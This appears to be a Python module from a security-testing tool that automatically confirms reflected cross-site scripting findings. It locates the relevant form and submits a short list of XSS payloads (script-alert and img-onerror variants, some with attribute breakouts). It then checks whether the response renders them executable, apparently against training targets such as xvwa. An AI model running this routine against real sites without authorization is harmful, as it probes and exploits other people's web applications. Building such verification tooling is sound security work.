"""Direct (first-order) agent: deliver a payload into one request path and verify it.

The slice names the input parameter and the sink on the same page, so there is
no database round trip: build a candidate request, send it, and read the
response with ``verify_tag``. The agent's output is the same ``TriggerResult``
shape the pipeline already understands, so scheduling stays uniform.

First-order vs second-order is decided by where the slice came from (the navi
``direct/`` tree versus the joined/inject trees), never by inspecting the
slice's own features.
"""

from __future__ import annotations

import os
import re
import secrets
from typing import Any
from urllib.parse import urlencode

from tia.cap.entry import infer_read_entry
from tia.dom.trigger import (
    _FORM_ACTION_RE,
    _FORM_METHOD_RE,
    _INPUT_NAME_RE,
    StageRecord,
    TriggerResult,
    normalize_slice,
)
from tia.inf.runtime import get_runtime
from tia.orch.kernel import Kernel, LocalToolClient, ToolCallError, ToolClient

#: Bounded exploration: markup contexts need a couple of shapes, not a fuzzer.
DIRECT_ATTEMPTS = max(1, int(os.environ.get("TIA_DIRECT_ATTEMPTS", "6")))

#: Payload shapes, cheapest and most likely first. ``{tag}`` is a 4-char marker
#: that lets ``verify_tag`` prove the bytes arrived.
_PAYLOADS = (
    "<script>alert('{tag}')</script>",
    '<img src=x onerror=alert("{tag}")>',
    '"><script>alert(\'{tag}\')</script>',
    "'><img src=x onerror=alert('{tag}')>",
    "{tag}",
)


def _tag() -> str:
    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
    return "".join(secrets.choice(alphabet) for _ in range(4))


_FORM_BLOCK_RE = re.compile(r"<form\b[^>]*>.*?</form>", re.IGNORECASE | re.DOTALL)


def _forms(html: str) -> list[tuple[str, str, dict[str, str]]]:
    """Every form in document order as (action, method, fields)."""
    found: list[tuple[str, str, dict[str, str]]] = []
    for block in _FORM_BLOCK_RE.finditer(html):
        text = block.group(0)
        action_match = _FORM_ACTION_RE.search(text)
        method_match = _FORM_METHOD_RE.search(text)
        fields: dict[str, str] = {}
        for name_match in _INPUT_NAME_RE.finditer(text):
            fields.setdefault(name_match.group(1), "")
        found.append(
            (
                action_match.group(1) if action_match else "",
                (method_match.group(1) if method_match else "GET").upper(),
                fields,
            )
        )
    return found


def _form_fields(html: str, param: str = "") -> tuple[str, str, dict[str, str]]:
    """Pick the form that carries ``param``; the page often has a header form.

    The first form on an xvwa page is usually the site-wide login box, so
    matching the entry parameter beats document order.
    """
    forms = _forms(html)
    if not forms:
        return "", "GET", {}
    if param:
        for action, method, fields in forms:
            if param in fields:
                return action, method, fields
    return forms[0]


async def run_direct(
    raw_slice: dict[str, Any],
    *,
    base_url: str,
    payload_base: str = "<script>alert(1)</script>",
    budget: int = 40,
    client: ToolClient | None = None,
    slice_id: str | None = None,
) -> TriggerResult:
    """D0–D4: create case, find the input, deliver candidates, verify the response."""
    del payload_base  # direct mode starts from context-shaped payloads, not a template
    raw = normalize_slice(raw_slice)
    kernel = Kernel(
        "inject",  # same capability surface: read source, send HTTP, verify
        case_id=None,
        budget=budget,
        client=client or LocalToolClient("inject"),
    )
    source_param = ""
    sources = raw.get("sources")
    if isinstance(sources, list) and sources:
        first = sources[0]
        if isinstance(first, dict):
            source_param = str(first.get("param") or "")
    opened = await kernel.call(
        "case_open",
        {"slice": raw, "agent": "direct", "write_targets": []},
    )
    case_id = str(opened["case_id"])
    kernel.case_id = case_id
    kernel.slice_id = slice_id
    stages = [StageRecord("D0", True, f"case={case_id}")]
    notes: dict[str, Any] = {"order_mode": "direct", "source_param": source_param}

    file, line, sink_code = _sink_of(raw)
    if not file:
        stages.append(StageRecord("D1", False, "slice has no sink file"))
        return await _finish(kernel, case_id, "NOT_EXECUTED", stages, notes, "")

    # D1 Source context: the parameter and the sink shape come from the window.
    window = await kernel.call(
        "source_read",
        {"file": file, "around": {"line": line, "n": 40}},
    )
    text = "\n".join(str(item.get("text", "")) for item in window.get("lines", []))
    method, fields = infer_read_entry(text, require_where=False)
    if source_param and not any(field.name == source_param for field in fields):
        notes["source_param_not_in_window"] = True
    notes["sink_code"] = sink_code
    notes["source_window_sha256"] = window.get("sha256")
    stages.append(StageRecord("D1", True, f"file={file}:{line} method={method}"))

    # D2 Entry page: the form tells us where to deliver and which fields to send.
    page = await kernel.call("http_request", {"method": "GET", "url": base_url})
    body = str(page.get("body", ""))
    status = int(page.get("status", 0))
    if status >= 400:
        notes["page_status"] = status
        stages.append(StageRecord("D2", False, f"page status {status}"))
        return await _finish(kernel, case_id, "READ_NOT_REFLECTED", stages, notes, "")
    action, form_method, form_fields = _form_fields(body, source_param)
    target = _absolute(action, base_url) if action else base_url
    names = list(form_fields) or [field.name for field in fields if field.name]
    param = source_param or (fields[0].name if fields else (names[0] if names else ""))
    notes["entry"] = {"url": target, "method": form_method, "param": param}
    stages.append(StageRecord("D2", True, f"action={target} method={form_method} param={param}"))

    # D3–D4 Bounded candidate delivery; the first executable hit wins.
    attempts: list[dict[str, Any]] = []
    for index, template in enumerate(_PAYLOADS[:DIRECT_ATTEMPTS]):
        tag = _tag()
        payload = template.format(tag=tag)
        if names:
            values = {name: "" for name in names}
            if param:
                values[param] = payload
        else:
            values = {param: payload} if param else {}
        try:
            if form_method == "POST":
                request = {
                    "method": "POST",
                    "url": target,
                    "body": urlencode(values),
                    "headers": {"content-type": "application/x-www-form-urlencoded"},
                }
            else:
                request = {"method": "GET", "url": target, "params": values}
            response = await kernel.call("http_request", request)
        except ToolCallError as exc:
            err_body = exc.envelope.error
            attempts.append(
                {
                    "index": index,
                    "payload": payload,
                    "error": err_body.code if err_body else "TOOL_ERROR",
                }
            )
            continue
        html = str(response.get("body", ""))
        content_type = str(response.get("content_type") or "text/html")
        verify = await kernel.call(
            "verify_tag",
            {"html": html, "tag": tag, "payload": payload, "content_type": content_type},
        )
        best = verify.get("best") if isinstance(verify.get("best"), dict) else {}
        attempt = {
            "index": index,
            "payload": payload,
            "payload_length": len(payload),
            "found": bool(verify.get("found")),
            "occurrences": verify.get("occurrence_count", 0),
            "executable": bool(best.get("executable")),
            "context_kind": best.get("context_kind"),
            "reason": best.get("executable_reason"),
            "node_path": best.get("node_path"),
        }
        attempts.append(attempt)
        if attempt["executable"]:
            notes["payload"] = payload
            notes["payload_constraints"] = {
                "context_kind": attempt["context_kind"],
                "node_path": attempt["node_path"],
                "payload_length": len(payload),
                "requires_breakout": attempt["context_kind"] in {"attr", "script_string"},
            }
            break
    notes["attempts"] = attempts
    stages.append(StageRecord("D3", True, f"attempts={len(attempts)}"))
    verdict, explanation = _judge(attempts)
    notes["explanation"] = explanation
    stages.append(StageRecord("D4", verdict == "EXECUTED", explanation))
    return await _finish(kernel, case_id, verdict, stages, notes, "")


def _judge(attempts: list[dict[str, Any]]) -> tuple[str, str]:
    if not attempts:
        return "NOT_EXECUTED", "no attempt could be delivered"
    executable = [item for item in attempts if item.get("executable")]
    if executable:
        return "EXECUTED", f"executable payload: {executable[0]['payload']}"
    found = [item for item in attempts if item.get("found")]
    if not found:
        return "READ_NOT_REFLECTED", "payload never appeared in the response"
    reasons = {str(item.get("reason")) for item in found}
    if "ENCODED_ONLY" in reasons:
        return "REFLECTED_ENCODED", "payload is encoded in the response"
    return "REFLECTED_INERT", "payload is reflected but not executable"


async def _finish(
    kernel: Kernel,
    case_id: str,
    verdict: str,
    stages: list[StageRecord],
    notes: dict[str, Any],
    _report_hint: str,
) -> TriggerResult:
    get_runtime().store.set_case_verdict(case_id, verdict, ceiling="EXECUTABLE")
    report = await kernel.report()
    stages.append(StageRecord("D5", True, "report generated"))
    return TriggerResult(
        case_id=case_id,
        verdict=verdict,
        residue=0,
        report=report,
        stages=stages,
        notes=notes,
        trace=kernel.trace,
    )


def _sink_of(raw: dict[str, Any]) -> tuple[str, int, str]:
    sink = raw.get("sink")
    if isinstance(sink, dict):
        return str(sink.get("file") or ""), int(sink.get("line") or 0), str(sink.get("code") or "")
    if isinstance(sink, str) and ":" in sink:
        head, _, rest = sink.partition(":")
        line_text, _, code = rest.partition(" ")
        return head, int(line_text) if line_text.isdigit() else 0, code
    return str(raw.get("sinkFile") or ""), int(raw.get("sinkLine") or 0), str(raw.get("sinkCode") or "")


def _absolute(action: str, base_url: str) -> str:
    if action.startswith(("http://", "https://")):
        return action
    if action.startswith("/"):
        root = "/".join(base_url.split("/")[:3])
        return root + action
    return base_url if base_url.endswith("/") else base_url + "/" + action

